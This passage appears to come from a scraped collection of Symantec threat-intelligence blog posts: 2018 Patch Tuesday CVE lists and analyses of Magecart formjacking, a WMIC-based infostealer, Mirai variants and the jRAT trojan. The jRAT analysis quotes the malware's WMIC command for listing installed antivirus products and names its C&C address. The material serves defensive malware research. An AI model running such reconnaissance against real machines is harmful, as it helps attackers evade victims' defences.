Escalation Vulnerability(CVE-2018-8480)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8488)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8498)MS Rating: Important Microsoft PowerPoint Security Bypass Vulnerability(CVE-2018-8501)MS Rating: Important Microsoft Excel Security Bypass Vulnerability(CVE-2018-8502)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2018-8504)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8518)MS Rating: Important Cumulative Security Update for Microsoft Azure Azure IoT Device Client SDK Memory Corruption Vulnerability(CVE-2018-8531)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Win32k Privilege Escalation Vulnerability(CVE-2018-8453)MS Rating: Important Windows Kernel Privilege Escalation Vulnerability(CVE-2018-8497)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8330)MS Rating: Important Cumulative Security Update for Microsoft Windows MS XML Remote Code Execution Vulnerability(CVE-2018-8494)MS Rating: Critical MFC Insecure Library Loading Vulnerability(CVE-2010-3190)MS Rating: Moderate Windows DNS Security Bypass Vulnerability(CVE-2018-8320)MS Rating: Important Linux On Windows Privilege Escalation Vulnerability(CVE-2018-8329)MS Rating: Important Microsoft Filter Manager Privilege Escalation Vulnerability(CVE-2018-8333)MS Rating: Important NTFS Privilege Escalation Vulnerability(CVE-2018-8411)MS Rating: Important Windows Theme API Remote Code Execution Vulnerability(CVE-2018-8413)MS Rating: Important Microsoft JET Database Engine Remote Code Execution Vulnerability(CVE-2018-8423)MS Rating: Important Microsoft Graphics Components Information Disclosure Vulnerability(CVE-2018-8427)MS Rating: Important Microsoft Graphics Components Remote Code Execution Vulnerability(CVE-2018-8432)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8472)MS Rating: Important Windows Media Player Information Disclosure Vulnerability(CVE-2018-8481)MS Rating: Important Windows Media Player Information Disclosure Vulnerability(CVE-2018-8482)MS Rating: Important DirectX Graphics Kernel Privilege Escalation Vulnerability(CVE-2018-8484)MS Rating: Important DirectX Information Disclosure Vulnerability(CVE-2018-8486)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8492)MS Rating: Important Windows TCP/IP Information Disclosure Vulnerability(CVE-2018-8493)MS Rating: Important Windows Shell Remote Code Execution Vulnerability(CVE-2018-8495)MS Rating: Important Microsoft Windows Codecs Library Information Disclosure Vulnerability(CVE-2018-8506)MS Rating: Important Cumulative Security Update for Microsoft SQL Server Management Studio SQL Server Management Studio Information Disclosure(CVE-2018-8527)MS Rating: Important SQL Server Management Studio Information Disclosure(CVE-2018-8532)MS Rating: Important SQL Server Management Studio Information Disclosure(CVE-2018-8533)MS Rating: Moderate Cumulative Security Update for Microsoft Windows Hyper-V Windows Hyper-V Remote Code Execution Vulnerability(CVE-2018-8489)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2018-8490)MS Rating: Critical More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-october-2018"
  },
  {
    "title": "symantec latest intelligence refresh",
    "content": "For more than a decade, Symantec has been publishing monthly intelligence reports, providing a snapshot of what is happening on the threat landscape. Over the years these reports have focused on a variety of activity, covering topics ranging from spam to botnets (and even spam botnets). Back in early 2016, we moved away from PDF reports and launched a new, dynamic page on the Symantec website, providing the latest intelligence available. Today we are happy to share the next iteration of thisLatest Intelligence page. With this new page comes a whole new set of metrics, previously only available annually in the ISTR, along with several old favorites from the intelligence reports over the years. We have also revamped the look and feel of the page, making it easier to navigate, as well as providing a more mobile-device-friendly interface. This new approach allows us the opportunity to tell new stories surrounding the threat landscape. We can now share trends on specific malicious activity classifications, ranging from ransomware, to cryptojacking events, to attacks against IoT devices. To provide a few real-world examples from just last month, financial Trojan activity rose in September by 12.5 percent when compared to August. Then, looking at the specific financial Trojans active during this time frame, we can see that Ramnit is responsible for the lion’s share of activity. However, it appears that this Trojan’s activity declined 6.9 percentage points since August. In comparison, Emotet and Trickybot saw an increase of 8.3 and 2.7 percentage points respectively, likely contributing to the overall increase in activity. Another interesting item that we decided to look at with the launch of this new page is network attack types. The metric reveals that SMB-related attacks dominate this field, comprising around half of all such attacks in a given month. In contrast, attacks against technologies such as Flash and Java, which were quite popular in past years, have declined drastically, well down into the single digits. As we stated in early 2016, when the first version of the Latest Intelligence page launched, the threat landscape is never the same two months in a row. One month there is a jump in web attacks; another might see a spike in downloader activity. This can make the threat landscape a tricky scene to navigate. We hope that ournew Latest Intelligence pagehelps make doing so just a little easier. Ben works for Symantec’s Security Response team, where he dives deep into the threat data, looking at long-term trends, and surfacing occasionally to submit blogs, whitepapers, graphics, and video content. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/symantec-latest-intelligence-refresh"
  },
  {
    "title": "formjacking attacks retailers",
    "content": "Symantec has seen a major uptick in formjacking attacks recently, with publicly reported attacks on the websites of companies including Ticketmaster, British Airways, Feedify, and Newegg by a group called Magecart being the most notable examples. Formjacking is a term we use to describe the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout web pages of e-commerce sites. Formjacking is not a new technique, but recent campaigns are interesting as they are large, sophisticated, and have increased dramatically since mid-August 2018. Symantec’s Intrusions Prevention System (IPS) technology proactively protects website users from formjacking attacks. When a customer of an e-commerce site clicks “submit” or its equivalent after entering their details into a website’s payment form, malicious JavaScript code that has been injected there by the cyber criminals collects all entered information, such as payment card details and the user’s name and address. This information is then sent to the attacker’s servers. Attackers can then use this information to perform payment card fraud or sell these details to other criminals on the dark web. This is a significant and sustained campaign, with activity increasing substantially in the week of September 13 to 20. According to Symantec telemetry, since August 13 we have blocked 248,000 attempts at formjacking—almost a quarter of a million instances. However, more than one third of those blocks (36 percent) occurred from September 13 to 20, indicating that this activity is increasing. If we compare the week of September 13 to 20 to the same week in August, the number of instances of formjacking blocked by Symantec more than doubled, jumping from just over 41,000 to almost 88,500—a percentage increase of 117 percent. Since August 13, we have blocked an average of 6,368 formjacking attempts every day. Our data shows that any company, anywhere in the world, which processes payments online is a potential victim of formjacking As we can see from the publicly reported attacks, Magecart is targeting large e-commerce businesses like Ticketmaster, British Airways, and Newegg. To get an insight into the type of businesses that are being targeted by formjacking attacks, we examined 1,000 instances of formjacking blocked by Symantec over a three-day period from September 18 to 20. Symantec data showed that from these 1,000 instances 57 individual websites were impacted. These websites were mostly online retail sites ranging from small niche sites to larger retail operations. Websites affected ranged from a fashion retailer in Australia, to a supplier of outdoor accessories in France, and a fitness retailer in Italy. Other retailers affected included a supplier of parts for cars and sites selling kitchen accessories and customized gifts. While the compromise of larger organizations such as British Airways and Ticketmaster makes headlines, our data shows that any company, anywhere in the world, which processes payments online is a potential victim of formjacking. Magecart is the attack group behind the recent formjacking attacks on British Airways, Ticketmaster, Feedify, and Newegg. Magecart has been active since at least 2015. The group injects web-based card skimmers onto websites to steal payment card data and other sensitive information from online payment forms. The group used to primarily focus on hacking into Magneto online stores, but it appears to have changed tactics recently, and we now see it using formjacking and supply chain compromise to steal payment card data. There are many ways attackers can attempt to compromise websites, but in the Ticketmaster formjacking case the Magecart attackers used a supply chain attack to gain access to the website and change the code on its payment page. Wewrote about supply chain attacks in ISTR 23and predicted we would continue to see them occurring frequently in 2018—and we have. Supply chain attacks can allow attackers to gain access to large companies by exploiting weaknesses in smaller businesses used by the larger company to provide different services. Thefamous Petya/NotPetya campaign, for example, was distributed via a supply chain attack. Supply chain attacks are particularly challenging because it doesn’t matter how good your business’ cyber security is if other businesses with access to your network can be exploited by attackers. The uptick in formjacking attacks came to wider notice following the Ticketmasterbreach, which was reported in June. The Magecart attackers injected malicious JavaScript code onto Ticketmaster’s website after they compromised a chatbot from tech firm Inbenta that was used for customer support on Ticketmaster websites. Magecart was then able to alter the JavaScript code on Ticketmaster’s websites to capture payment card data from customers and send it to their servers. The code may have been on the Ticketmaster website for almost a year, with international Ticketmaster customers warned they may have been affected if they bought tickets between September 2017 and June 2018. Inbenta said Magecart had exploited a number of vulnerabilities to target its front-end servers and alter the chatbot code. Following the Ticketmaster breachit was revealed that Magecart was widely targeting third-party companies that are used on e-commerce sitesto manage analytics, website support, and other services. The report at that time said at least 800 e-commerce sites had been hit in that campaign. The danger is that if Magecart can compromise one widely used third-party supplier, they could potentially infect thousands of sites in one go. Feedify is one such third-party service that is used by many websites to serve up push notifications to website visitors. It wasnotified by a threat researcher on September 11 that some of its JavaScript code had been modifiedwith the Magecart script, which prompted Feedify to delete the code. However, within 24 hours the code had been modified again, Feedify again deleted it but it once again reappeared, with threat researchers subsequently warning users of Feedify to stop using it until the issue was resolved. Magecart’sattack on British Airways—which the airline said impacted 380,000 passengers—was, along with Ticketmaster, its most high-profile attack so far. In the attacks on both British Airways andU.S. electronics retailer Newegg, the Magecart attackers took steps to avoid detection, including setting up spoofed web domains designed to look like those of the legitimate company. They even purchased paid SSL certificates from Comodo to make them look more like legitimate servers. British Airways and Newegg were both compromised in a similar manner, with a small amount of JavaScript code added to a page on the companies’ websites to allow entered payment information to be sent to the Magecart attackers’ servers via the spoofed domains. The attacks took place in a similar timeframe, with Magecart present on British Airway’s website from August 21 to September 5, and Newegg’s website from August 14 to September 18. In the cases of both British Airways and Newegg the initial infection vector that allowed the attackers to gain access to the websites is not known. Victims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection. Symantec customers are protected from formjacking attacks. Network-based protection File-based protection Website owners should also be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/formjacking-attacks-retailers"
  },
  {
    "title": "microsoft patch tuesday september 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the September 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8367)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8391)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8447)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8456)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8457)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8459)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8461)MS Rating: Critical Microsoft Edge PDF Remote Code Execution Vulnerability(CVE-2018-8464)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8465)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8466)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8467)MS Rating: Critical Microsoft Browsers Information Disclosure Vulnerability(CVE-2018-8315)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2018-8354)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8366)MS Rating: Important Microsoft Edge Spoofing Vulnerability(CVE-2018-8425)MS Rating: Important Microsoft Browser Information Disclosure Vulnerability(CVE-2018-8452)MS Rating: Important Microsoft Edge Elevation of Privilege Vulnerability(CVE-2018-8463)MS Rating: Important Microsoft Edge Elevation of Privilege Vulnerability(CVE-2018-8469)MS Rating: Important Internet Explorer Elevation of Privilege Vulnerability(CVE-2018-8470)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8331)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2018-8426)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-8428)MS Rating: Important Word PDF Remote Code Execution Vulnerability(CVE-2018-8430)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2018-8429)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-8431)MS Rating: Important Cumulative Security Update for Microsoft .NET Framework .NET Framework Remote Code Execution Vulnerability(CVE-2018-8421)MS Rating: Critical ASP.NET Core Denial of Service(CVE-2018-8409)MS Rating: Important OData Denial of Service Vulnerability(CVE-2018-8269)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2018-8336)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8419)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8442)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8443)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8445)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8446)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2018-8455)MS Rating: Important Cumulative Security Update for Microsoft Microsoft Windows Hyper-V Windows Hyper-V Remote Code Execution Vulnerability(CVE-2018-0965)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2018-8439)MS Rating: Critical Windows Hyper-V Denial of Service Vulnerability(CVE-2018-8436)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2018-8437)MS Rating: Important Windows Hyper-V Information Disclosure Vulnerability(CVE-2018-8434)MS Rating: Important Windows Hyper-V Security Feature Bypass Vulnerability(CVE-2018-8435)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2018-8438)MS Rating: Important Cumulative Security Update for Microsoft JET Database Engine Microsoft JET Database Engine Remote Code Execution Vulnerability(CVE-2018-8392)MS Rating: Important Microsoft JET Database Engine Remote Code Execution Vulnerability(CVE-2018-8393)MS Rating: Important Cumulative Security Update for Microsoft Windows Win32k Graphics Remote Code Execution Vulnerability(CVE-2018-8332)MS Rating: Critical MS XML Remote Code Execution Vulnerability(CVE-2018-8420)MS Rating: Critical Windows Remote Code Execution Vulnerability(CVE-2018-8475)MS Rating: Critical Windows SMB Denial of Service Vulnerability(CVE-2018-8335)MS Rating: Important Windows SMB Information Disclosure Vulnerability(CVE-2018-8444)MS Rating: Important Windows Information Disclosure Vulnerability(CVE-2018-8271)MS Rating: Important Windows Subsystem for Linux Security Feature Bypass Vulnerability(CVE-2018-8337)MS Rating: Important Windows Registry Elevation of Privilege Vulnerability(CVE-2018-8410)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8424)MS Rating: Important Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2018-8433)MS Rating: Important Windows ALPC Elevation of Privilege Vulnerability(CVE-2018-8440)MS Rating: Important Windows Subsystem for Linux Elevation of Privilege Vulnerability(CVE-2018-8441)MS Rating: Important Device Guard Security Feature Bypass Vulnerability(CVE-2018-8449)MS Rating: Important DirectX Graphics Kernel Elevation of Privilege Vulnerability(CVE-2018-8462)MS Rating: Important Windows Elevation of Privilege Vulnerability(CVE-2018-8468)MS Rating: Important Security Update for Microsoft Azure IoT SDK Azure IoT SDK Spoofing Vulnerability(CVE-2018-8479)MS Rating: Important Security Update for Lync for Mac Lync for Mac 2011 Security Feature Bypass Vulnerability(CVE-2018-8474)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Himanshu is a senior member of Symantec's Cyber Security Services organization. An active contributor to numerous security communities, he frequently provides insight on vulnerabilities and shares his knowledge by writing reports, blogs, and journals. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-september-2018"
  },
  {
    "title": "wmic download malware",
    "content": "We recently observed malware authors using a combination of a tool found on all Windows computers and a usually innocuous file type associated with modifying and rendering XML documents. While these two things—the Windows Management Instrumentation Command-line (WMIC) utility and an eXtensible Stylesheet Language (XSL) file—would not normally raise suspicion if found on a computer, in this case they’re used as part of a multistage infection chain that delivers a modular information-stealing threat. The use of WMI by cyber criminals is not new, however, the tool is typically used for propagation but in this case is used to download a malicious file. The use of WMIC is beneficial for the attackers as it helps them to remain inconspicuous and also provides them with a powerful tool to aid them in their activities. The WMIC utility provides a command-line interface for WMI, which is used for an array of administrative capabilities for local and remote systems and can be used to query system settings, stop processes, and locally or remotely execute scripts. Parallels can be drawn between WMIC and PowerShell, another legitimate tool which is also found on Windows systems and is increasingly being abused by cyber criminals. PowerShell’s popularity among cyber criminals was highlighted when Symantec saw a661 percent increase in malicious PowerShell activityfrom H2 2017 to H1 2018. The use of WMIC here, as well as a host of additional legitimate dual-use tools used in this attack, adds to the continuing evidence of cyber criminals using so-called “living off the land” tactics in order to reduce the chances of their activity being detected. Thankfully Symantec has multiple technologies in place to protect customers from these types of attacks and the tactics used in this particular case were successfully blocked by our file-, behavior-, and network-based protection including Symantec’s advanced machine learning technology. Malware authors are continuously trying to fly under the radar of security products. Their attack techniques are evolving, and they are constantly coming up with new ways to introduce their malware onto computers. For instance, they may drop an encrypted payload and decrypt it in memory to try and bypass security detections. Or instead of directly downloading and executing the payload, they may make use of non-PE files to drop their malware. They may also try to exploit Microsoft tools to download payloads, as we’ve observed in this case. As previously mentioned, as part of our ongoing work to protect customers from these types of attacks we spotted an attack chain that incorporates many layers of obscurity. Email password stealer- The malware uses the MailPassview utility to capture email account passwords. Web browser password stealer- The malware uses WebBrowser Passview to steal passwords stored in web browsers. Keylogger- The malware uses the global keyboard hook WindowsKeyboardhook to capture keystrokes and writes all keystrokes into a file in an encrypted form. It also logs the contents of the clipboard and active window titles. The keylogger requires the keyboard layout to be set to Japanese in order to capture keystrokes. It checks for keyboard layout type value 0x7 (Japanese keyboard). If the value doesn’t match it will not capture keystrokes. The keylogger cannot connect to the command and control (C&C) servers by itself – the network module is required to transfer the stolen information to the attackers’ servers. Network/phishing- The malware uses the phishing module and uses http://renivaxx01.gettrails[DOT]com/01/ for phishing. The remaining three modules—File browser, Backdoor, Coinminer—are unremarkable and their functionality is just as their names suggest. Symantec has multiple technologies to protect customers against the threats discussed in this blog. File-based protection: Behavior-based detection: Network-based protection: Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. Vaibhav is member of Symantec’s Security Technology and Response team where he is focused on static and dynamic malware analysis. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/wmic-download-malware"
  },
  {
    "title": "mirai cross platform infection",
    "content": "It’s safe to say that the last few years have been eventful when it comes to the Internet of Things (IoT) threat landscape, with new waves of distributed denial of service (DDoS) bots emerging with increasing regularity. Ever since thefirst reported incidentof the Mirai botnet (Linux.Mirai) back in 2016, followed by the malware’s source code being leaked, the number of variants of this family has been growing steadily, their success helped along by an environment of poorly managed IoT devices. As it is, the IoT market is hugely fragmented and most of the devices do not receive software patches for the known vulnerabilities. To make things worse, the malware authors continue to evolve these variants, making the malware more powerful and portable across different platforms and architectures. One of the major pain points for a cross-platform IoT botnet is portability. The malware must be able to run on different architectures and platforms in a self-contained capsule without any runtime surprises or misconfiguration. This is also an area where many inexperienced malware authors, or script-kiddies, fail if they simply copy/paste and reuse the existing malware code base. At the end of July, I came across a live remote server hosting multiple malware variants, each for a specific platform. As with many Mirai infections, it starts by firing a shell script on a vulnerable device. That shell script sequentially tries downloading and executing individual executables one by one until a binary compliant with the current architecture is found. The successfully executed executable file is responsible for the actual Mirai payload, such as enumerating a list of IP addresses by creating a list of random addresses and scanning for devices with default credentials, or vulnerabilities. While this is similar behavior to the Mirai variants we’ve seen so far, what makes it interesting is the compiled binary. These variants have been created by leveraging an open-source project calledAboriginal Linuxthat makes the process of cross-compilation easy, effective, and practically fail-proof. It should be noted that there is nothing malicious or wrong with this open-source project, the malware authors are once again leveraging legitimate tools to supplement their creations, this time with an effective cross compilation solution. Given that the existing code base is combined with an elegant cross-compilation framework, the resultant malware variants are more robust and compatible with multiple architectures and devices, making it executable on a wide variety of devices ranging from routers, IP cameras, connected devices, and even Android devices. For example, Figure 2 shows an ARM7 malware variant running on an Android device running Android 4.4, and Figure 3 shows the sample running on Debian ARM. The remainder of the malware’s functionalities are consistent with known Mirai behavior. For example, when I executed the sample in a contained environment, it attempted to scan more than 500,000 IP addresses generated through the random generation process previously described, and then tried to send raw packet data over port 23. Symantec and Norton products detect the threats discussed in this blog as: Symantec has the following tips to protect your IoT device from becoming infected with malware: Dinesh is a threat analyst specializing in mobile malware. He's constantly researching and creating protection and remediation routines, building a knowledge graph of threat families using machine learning based classification and clustering techniques. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/mirai-cross-platform-infection"
  },
  {
    "title": "jrat new anti parsing techniques",
    "content": "We have recently observed a newer version of the cross-platform jRAT (Trojan.Maljava) remote access Trojan (RAT) in the wild. This version uses new techniques to evade parsing and detection, as well as to prevent itself from being reverse-engineered, by prepending corrupt MZ files before the malicious JAR file. We first spotted this version of jRAT in early November 2017. In April 2018, we noticed its number increased more than 300 percent to 1,071 from 333 in March. There could be two reasons why we have not seen huge hits for this version: 1) It wants to remain stealthy and difficult to detect, and used only for targeted attacks; and 2) It may not be widely adopted yet among attackers. While the volumes of these attacks are on the lower side, this jRAT has shown that it is quite capable and can go undetected with minimum presence and anti-parsing methods. The malware mainly targets the financial sector, but we’ve also seen infections in the service, communications, hospitality, government, and energy sectors. The malware mainly targets the financial sector, but we’ve also seen infections in the service, communications, hospitality, governments, and energy sectors. The infection chain begins with spam emails, which are specially crafted using social engineering techniques to entice victims into opening the attachment. We’ve seen several themes for emails distributing this version of jRAT, including: The emails contain a JAR file attachment. This file comes with a surprise MZ header, as well as two corrupt MZ files prepended before the JAR file. This thwarts not only MZ parsers, but Java parsers as well. These files do not contain \\x00 bytes, which indicates the intent. The MZ files cannot be parsed due to a broken PE structure; the files appear to be full MZ but apparently are used only for evading parsers. This may be considered a defense layer to protect the JAR file from being reverse-engineered. Surprisingly, Java is still able to load and execute this JAR file as weaker zip parsing implementations rely on end of central directory record and parses the content to locate and execute main class. This file can be recognized as jRAT by looking at the class names. The wrapper JAR file drops a secondary JAR file and copies it to a%Temp%location. The payload JAR file can be extracted using AES decryption. The first 16 bytes in the file “k”seen in Figure 4 contains the key and the file “e” is the encrypted Java payload. The JAR runs every time Windows starts, and starts executing and connecting to its command and control (C&C) server at84.[REMOVED].132.145. It uses a WMIC interface to identify antivirus products installed on the compromised computer and firewall details. wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get /format:list The configuration file and key file are visible, but the former is AES-encrypted. The JAR file contains various classes for platform-specific implementations for capturing screenshots, playing audio, downloading and executing files, I/O to and from files, logging keystrokes, among others. This new version of jRAT has the following capabilities: With these capabilities, the malware can violate victims’ privacy and capture and exfiltrate confidential information from target organizations. It’s also potentially capable of running on the following platforms: FreeBSD, OpenBSD, OSX, Solaris, Linux, Windows, and Android. Symantec and Norton products detect this threat as the following: Symantec Email Security.cloud technology blocks attacks such as this using advanced heuristics. Symantec advises users to be careful while opening emails about monetary transactions containing JAR attachments. Rohit works for the Symantec .Cloud Security team in Symantec's Security Technology and Response (STAR) division. His main areas of interest include reverse engineering, detection logic, and researching new technologies. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/jrat-new-anti-parsing-techniques"
  },
  {
    "title": "microsoft patch tuesday august 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the August 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8266)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8371)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8372)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8373)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8355)MS Rating: Critical Scripting Engine Information Disclosure Vulnerability(CVE-2018-8359)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8380)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8381)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8384)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8385)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8387)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8390)MS Rating: Critical Microsoft Browser Memory Corruption Vulnerability(CVE-2018-8403)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8377)MS Rating: Critical Internet Explorer Remote Code Execution Vulnerability(CVE-2018-8316)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8351)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2018-8353)MS Rating: Important Internet Explorer Privilege Escalation Vulnerability(CVE-2018-8357)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8358)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8370)MS Rating: Important Microsoft Edge Spoofing Vulnerability(CVE-2018-8383)MS Rating: Important Microsoft Edge Privilege Escalation Vulnerability(CVE-2018-8388)MS Rating: Low Scripting Engine Memory Corruption Vulnerability(CVE-2018-8389)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Exchange Memory Corruption Vulnerability(CVE-2018-8302) MS Rating: Critical Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8375)MS Rating: Important Microsoft PowerPoint Remote Code Execution Vulnerability(CVE-2018-8376)MS Rating: Important Microsoft Office Information Disclosure Vulnerability(CVE-2018-8378)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8379)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2018-8382)MS Rating: Important Microsoft Exchange Server Tampering Vulnerability(CVE-2018-8374)MS Rating: Moderate Cumulative Security Update for Microsoft .NET Framework .NET Framework Information Disclosure Vulnerability(CVE-2018-8360)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Privilege Escalation Vulnerability(CVE-2018-8347)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8348)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2018-8399)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2018-8404)MS Rating: Important Cumulative Security Update for Microsoft Windows Microsoft SQL Server Remote Code Execution Vulnerability(CVE-2018-8273)MS Rating: Critical Microsoft Graphics Remote Code Execution Vulnerability(CVE-2018-8344)MS Rating: Critical LNK Remote Code Execution Vulnerability(CVE-2018-8345)MS Rating: Critical Windows PDF Remote Code Execution Vulnerability(CVE-2018-8350)MS Rating: Critical GDI+ Remote Code Execution Vulnerability(CVE-2018-8397)MS Rating: Critical Diagnostic Hub Standard Collector Privilege Escalation Vulnerability(CVE-2018-0952)MS Rating: Important Cortana Privilege Escalation Vulnerability(CVE-2018-8253)MS Rating: Important Windows Installer Privilege Escalation Vulnerability(CVE-2018-8339)MS Rating: Important ADFS Security Bypass Vulnerability(CVE-2018-8340)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8341)MS Rating: Important Windows NDIS Privilege Escalation Vulnerability(CVE-2018-8342)MS Rating: Important Windows NDIS Privilege Escalation Vulnerability(CVE-2018-8343)MS Rating: Important LNK Remote Code Execution Vulnerability(CVE-2018-8346)MS Rating: Important Microsoft COM for Windows Remote Code Execution Vulnerability(CVE-2018-8349)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8394)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8396)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8398)MS Rating: Important DirectX Graphics Kernel Privilege Escalation Vulnerability(CVE-2018-8400)MS Rating: Important DirectX Graphics Kernel Privilege Escalation Vulnerability(CVE-2018-8401)MS Rating: Important DirectX Graphics Kernel Privilege Escalation Vulnerability(CVE-2018-8405)MS Rating: Important DirectX Graphics Kernel Privilege Escalation Vulnerability(CVE-2018-8406)MS Rating: Important Microsoft (MAU) Office Privilege Escalation Vulnerability(CVE-2018-8412)MS Rating: Important Windows Shell Remote Code Execution Vulnerability(CVE-2018-8414)MS Rating: Important Cumulative Security Update for Microsoft Device Guard Code Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8200)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8204)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-august-2018"
  },
  {
    "title": "hacked mikrotik router",
